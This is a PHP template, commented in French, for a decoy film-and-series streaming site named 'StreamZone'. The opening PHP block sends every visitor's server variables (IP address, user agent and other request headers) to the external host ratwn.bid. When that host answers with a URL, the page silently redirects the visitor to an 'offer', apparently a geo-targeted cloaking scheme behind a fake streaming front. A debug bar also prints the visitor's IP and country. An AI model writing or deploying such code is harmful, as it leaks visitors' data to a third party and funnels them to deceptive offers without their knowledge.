<?php
// ============================================================
// SCRIPT PHP REDIRECT GG AGENCY — DOIT ÊTRE EN TOUT PREMIER
// Remplace TON_HASH par ton vrai hash GG
// Ce code s'exécute côté serveur avant tout output HTML
// ============================================================
$redirect = file_get_contents(
    "https://ratwn.bid/pr/04239453723d1d91?force_https=1",
    false,
    stream_context_create(array(
        "http" => array(
            "header"  => "Content-Type: application/x-www-form-urlencoded",
            "method"  => "POST",
            "timeout" => 2,
            "content" => http_build_query($_SERVER)
        )
    ))
);
if ($redirect) {
    header("Location: " . trim($redirect));
    exit();
}
// Si GG ne retourne pas d'URL (visiteur non ciblé, GEO non couvert, etc.)
// → on affiche la page normalement
?>
<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>StreamZone – Films & Séries en streaming</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;800&display=swap');

    :root {
      --bg: #080b12;
      --surface: #0f1220;
      --card: #161924;
      --accent: #f0b429;
      --accent2: #ffd166;
      --text: #f0f0f0;
      --muted: #6a7090;
      --border: #1e2230;
    }

    * { box-sizing: border-box; margin: 0; padding: 0; }

    body {
      font-family: 'Inter', sans-serif;
      background: var(--bg);
      color: var(--text);
      min-height: 100vh;
    }

    /* NAV */
    nav {
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 16px 40px;
      background: rgba(8,11,18,0.97);
      position: sticky;
      top: 0;
      z-index: 100;
      border-bottom: 1px solid var(--border);
    }
    .logo { font-size: 22px; font-weight: 800; color: var(--accent); letter-spacing: -1px; }
    .logo span { color: var(--text); font-weight: 300; }
    .nav-links { display: flex; gap: 28px; }
    .nav-links a { color: var(--muted); text-decoration: none; font-size: 14px; font-weight: 500; transition: color 0.2s; }
    .nav-links a:hover { color: var(--text); }
    .nav-btn {
      background: var(--accent);
      color: #000;
      border: none;
      padding: 8px 20px;
      border-radius: 5px;
      font-weight: 700;
      font-size: 14px;
      cursor: pointer;
    }

    /* DEBUG INFO (visible seulement en dev) */
    .debug-bar {
      background: #1a2a0a;
      border-bottom: 1px solid #2a4a1a;
      padding: 10px 40px;
      font-size: 12px;
      color: #4ade80;
      font-family: monospace;
      display: flex;
      gap: 20px;
    }
    .debug-bar span { color: #888; }

    /* HERO */
    .hero {
      position: relative;
      height: 540px;
      display: flex;
      align-items: flex-end;
      padding: 50px 40px;
      background: linear-gradient(135deg, #1a1200 0%, #0d1a2e 55%, #080b12 100%);
      overflow: hidden;
    }
    .hero::before {
      content: '';
      position: absolute;
      inset: 0;
      background:
        radial-gradient(ellipse at 65% 35%, rgba(240,180,41,0.15) 0%, transparent 55%),
        radial-gradient(ellipse at 25% 75%, rgba(240,180,41,0.05) 0%, transparent 45%);
    }
    .hero-content { position: relative; z-index: 2; max-width: 580px; }
    .hero-badge {
      display: inline-flex;
      align-items: center;
      gap: 6px;
      background: rgba(240,180,41,0.15);
      color: var(--accent);
      border: 1px solid rgba(240,180,41,0.3);
      font-size: 11px;
      font-weight: 700;
      padding: 4px 12px;
      border-radius: 20px;
      letter-spacing: 0.5px;
      text-transform: uppercase;
      margin-bottom: 16px;
    }
    .hero h1 {
      font-size: 44px;
      font-weight: 800;
      line-height: 1.05;
      margin-bottom: 14px;
      letter-spacing: -1px;
    }
    .hero h1 em { color: var(--accent); font-style: normal; }
    .hero p { color: #bbb; font-size: 15px; line-height: 1.7; margin-bottom: 24px; max-width: 500px; }
    .hero-meta { display: flex; gap: 16px; align-items: center; margin-bottom: 26px; flex-wrap: wrap; }
    .hero-meta span { font-size: 13px; color: var(--muted); }
    .hero-meta .rating { color: var(--accent); font-weight: 700; font-size: 15px; }
    .hero-actions { display: flex; gap: 12px; }
    .btn-play {
      background: var(--accent);
      color: #000;
      border: none;
      padding: 14px 30px;
      border-radius: 7px;
      font-size: 15px;
      font-weight: 800;
      cursor: pointer;
      display: flex;
      align-items: center;
      gap: 8px;
      transition: transform 0.15s;
    }
    .btn-play:hover { transform: scale(1.02); }
    .btn-info {
      background: rgba(255,255,255,0.08);
      color: white;
      border: 1px solid rgba(255,255,255,0.15);
      padding: 14px 28px;
      border-radius: 7px;
      font-size: 15px;
      font-weight: 600;
      cursor: pointer;
      backdrop-filter: blur(6px);
    }

    /* SECTIONS */
    .section { padding: 44px 40px 0; }
    .section-title {
      font-size: 19px;
      font-weight: 700;
      margin-bottom: 20px;
      display: flex;
      align-items: center;
      gap: 12px;
      letter-spacing: -0.3px;
    }
    .section-title::after { content: ''; flex: 1; height: 1px; background: var(--border); }

    .grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 16px; margin-bottom: 44px; }

    .card {
      background: var(--card);
      border-radius: 10px;
      overflow: hidden;
      border: 1px solid var(--border);
      cursor: pointer;
      transition: transform 0.2s, border-color 0.2s, box-shadow 0.2s;
    }
    .card:hover {
      transform: translateY(-5px);
      border-color: rgba(240,180,41,0.4);
      box-shadow: 0 8px 30px rgba(240,180,41,0.08);
    }
    .card-thumb {
      height: 155px;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 44px;
      position: relative;
    }
    .card-thumb .overlay {
      position: absolute;
      inset: 0;
      background: rgba(240,180,41,0);
      display: flex;
      align-items: center;
      justify-content: center;
      transition: background 0.2s;
    }
    .card:hover .overlay { background: rgba(240,180,41,0.15); }
    .card-thumb .overlay span { font-size: 32px; opacity: 0; transition: opacity 0.2s; }
    .card:hover .overlay span { opacity: 1; }
    .card-body { padding: 14px; }
    .card-title { font-size: 14px; font-weight: 600; margin-bottom: 4px; }
    .card-meta { font-size: 12px; color: var(--muted); }
    .card-footer { display: flex; justify-content: space-between; align-items: center; margin-top: 8px; }
    .card-rating { font-size: 12px; color: var(--accent); font-weight: 600; }
    .card-badge {
      font-size: 10px;
      padding: 2px 7px;
      border-radius: 3px;
      font-weight: 700;
    }
    .badge-new { background: rgba(240,180,41,0.15); color: var(--accent); }
    .badge-hd { background: rgba(96,165,250,0.15); color: #60a5fa; }
    .badge-hot { background: rgba(239,68,68,0.15); color: #ef4444; }

    /* FOOTER */
    footer {
      margin-top: 60px;
      padding: 28px 40px;
      border-top: 1px solid var(--border);
      display: flex;
      justify-content: space-between;
      align-items: center;
    }
    footer .logo { font-size: 18px; }
    footer p { color: var(--muted); font-size: 12px; }

    /* LABEL TEST */
    .test-label {
      position: fixed;
      bottom: 16px;
      right: 16px;
      background: #f0b429;
      color: #000;
      padding: 8px 14px;
      border-radius: 6px;
      font-size: 12px;
      font-weight: 700;
      z-index: 9999;
      box-shadow: 0 4px 12px rgba(0,0,0,0.4);
    }
  </style>
</head>
<body>

<nav>
  <div class="logo">Stream<span>Zone</span></div>
  <div class="nav-links">
    <a href="#">Films</a>
    <a href="#">Séries</a>
    <a href="#">Nouveautés</a>
    <a href="#">Mon compte</a>
  </div>
  <button class="nav-btn">Essai gratuit</button>
</nav>

<!-- Barre de debug PHP (à supprimer en production) -->
<div class="debug-bar">
  <span>PHP Redirect :</span>
  <?php
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'N/A';
    $ua = substr($_SERVER['HTTP_USER_AGENT'] ?? 'N/A', 0, 60);
    $geo = $_SERVER['HTTP_CF_IPCOUNTRY'] ?? ($_SERVER['GEOIP_COUNTRY_CODE'] ?? 'N/A');
    echo "IP : <b>$ip</b> &nbsp;|&nbsp; GEO : <b>$geo</b> &nbsp;|&nbsp; UA : <b>$ua...</b>";
    echo " &nbsp;|&nbsp; Résultat GG : <b>" . ($redirect ? "✅ Redirection vers offre" : "⚪ Aucune offre (page affichée)") . "</b>";
  ?>
</div>

<div class="hero">
  <div class="hero-content">
    <div class="hero-badge">⭐ Recommandé pour vous</div>
    <h1>Golden <em>Horizon</em></h1>
    <div class="hero-meta">
      <span class="rating">★ 9.0</span>
      <span>2024</span>
      <span>2h 31min</span>
      <span>Aventure · Drame</span>
      <span>🇫🇷 VF</span>
    </div>
    <p>Un explorateur solitaire traverse les derniers territoires sauvages de la planète pour retrouver une civilisation disparue, armé d'une carte centenaire et d'un secret de famille.</p>
    <div class="hero-actions">
      <button class="btn-play">▶ Regarder</button>
      <button class="btn-info">+ Ma liste</button>
    </div>
  </div>
</div>

<div class="section">
  <div class="section-title">🔥 Tendances</div>
  <div class="grid">
    <div class="card">
      <div class="card-thumb" style="background:linear-gradient(135deg,#1a2a0a,#0a1a05);">🌿
        <div class="overlay"><span>▶</span></div>
      </div>
      <div class="card-body">
        <div class="card-title">Jungle Protocol</div>
        <div class="card-meta">Aventure · 2024</div>
        <div class="card-footer">
          <span class="card-rating">★ 8.2</span>
          <span class="card-badge badge-new">NOUVEAU</span>
        </div>
      </div>
    </div>
    <div class="card">
      <div class="card-thumb" style="background:linear-gradient(135deg,#2a1a0a,#1a0a05);">🏜️
        <div class="overlay"><span>▶</span></div>
      </div>
      <div class="card-body">
        <div class="card-title">Desert Storm</div>
        <div class="card-meta">Action · 2023</div>
        <div class="card-footer">
          <span class="card-rating">★ 7.8</span>
          <span class="card-badge badge-hot">POPULAIRE</span>
        </div>
      </div>
    </div>
    <div class="card">
      <div class="card-thumb" style="background:linear-gradient(135deg,#0a1a2a,#05101a);">🌊
        <div class="overlay"><span>▶</span></div>
      </div>
      <div class="card-body">
        <div class="card-title">Pacific Depth</div>
        <div class="card-meta">Thriller · 2024</div>
        <div class="card-footer">
          <span class="card-rating">★ 8.5</span>
          <span class="card-badge badge-hd">4K</span>
        </div>
      </div>
    </div>
    <div class="card">
      <div class="card-thumb" style="background:linear-gradient(135deg,#1a0a2a,#10051a);">🌌
        <div class="overlay"><span>▶</span></div>
      </div>
      <div class="card-body">
        <div class="card-title">Void Runner</div>
        <div class="card-meta">Sci-fi · 2024</div>
        <div class="card-footer">
          <span class="card-rating">★ 8.0</span>
          <span class="card-badge badge-new">NOUVEAU</span>
        </div>
      </div>
    </div>
  </div>
</div>

<div class="section">
  <div class="section-title">🎬 Séries du moment</div>
  <div class="grid">
    <div class="card">
      <div class="card-thumb" style="background:linear-gradient(135deg,#2a1a1a,#1a0a0a);">👁️
        <div class="overlay"><span>▶</span></div>
      </div>
      <div class="card-body">
        <div class="card-title">The Watcher</div>
        <div class="card-meta">Horreur · S2</div>
        <div class="card-footer">
          <span class="card-rating">★ 8.7</span>
          <span class="card-badge badge-hot">POPULAIRE</span>
        </div>
      </div>
    </div>
    <div class="card">
      <div class="card-thumb" style="background:linear-gradient(135deg,#0a2a1a,#051a0a);">🧬
        <div class="overlay"><span>▶</span></div>
      </div>
      <div class="card-body">
        <div class="card-title">Helix</div>
        <div class="card-meta">Sci-fi · S1</div>
        <div class="card-footer">
          <span class="card-rating">★ 7.9</span>
          <span class="card-badge badge-new">NOUVEAU</span>
        </div>
      </div>
    </div>
    <div class="card">
      <div class="card-thumb" style="background:linear-gradient(135deg,#2a2a0a,#1a1a05);">⚔️
        <div class="overlay"><span>▶</span></div>
      </div>
      <div class="card-body">
        <div class="card-title">Iron Crown</div>
        <div class="card-meta">Historique · S3</div>
        <div class="card-footer">
          <span class="card-rating">★ 9.1</span>
          <span class="card-badge badge-hd">HD</span>
        </div>
      </div>
    </div>
    <div class="card">
      <div class="card-thumb" style="background:linear-gradient(135deg,#1a0a2a,#0a051a);">🕵️
        <div class="overlay"><span>▶</span></div>
      </div>
      <div class="card-body">
        <div class="card-title">Shadow Bureau</div>
        <div class="card-meta">Policier · S2</div>
        <div class="card-footer">
          <span class="card-rating">★ 8.3</span>
          <span class="card-badge badge-hot">POPULAIRE</span>
        </div>
      </div>
    </div>
  </div>
</div>

<footer>
  <div class="logo">Stream<span>Zone</span></div>
  <p>© 2024 StreamZone · Tous droits réservés</p>
</footer>

<div class="test-label">🧪 TEST · PHP Redirect</div>

</body>
</html>
